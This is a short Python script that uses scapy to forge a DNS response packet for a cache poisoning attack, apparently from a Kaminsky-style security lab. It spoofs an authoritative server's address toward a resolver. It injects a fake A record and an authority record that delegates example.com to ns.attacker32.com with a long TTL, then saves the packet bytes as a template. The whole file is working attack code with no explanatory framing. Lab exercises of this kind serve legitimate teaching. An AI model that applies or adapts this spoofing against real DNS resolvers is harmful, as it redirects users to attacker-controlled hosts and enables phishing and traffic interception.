#!/usr/bin/python3
from scapy.all import *

targetName = 'twysw.example.com'
targetDomain = 'example.com'


IPpkt = IP(src='199.43.135.53', dst='10.9.0.53', chksum=0)
UDPpkt = UDP(sport=53, dport=33333, chksum=0)

Qdsec  = DNSQR(qname=targetName)

Anssec = DNSRR(rrname=targetName, type='A',
               rdata='1.2.3.4', ttl=259200)

NSsec  = DNSRR(rrname=targetDomain, type='NS',
               rdata='ns.attacker32.com', ttl=259200)

DNSpkt = DNS(id=0xAAAA, aa=1, ra=0, rd=0, cd=0, qr=1,
             qdcount=1, ancount=1, nscount=1, arcount=0,
             qd=Qdsec, an=Anssec, ns=NSsec)
Replypkt = IPpkt/UDPpkt/DNSpkt

with open('ip_resp.bin', 'wb') as f:
  f.write(bytes(Replypkt))
  Replypkt.show()
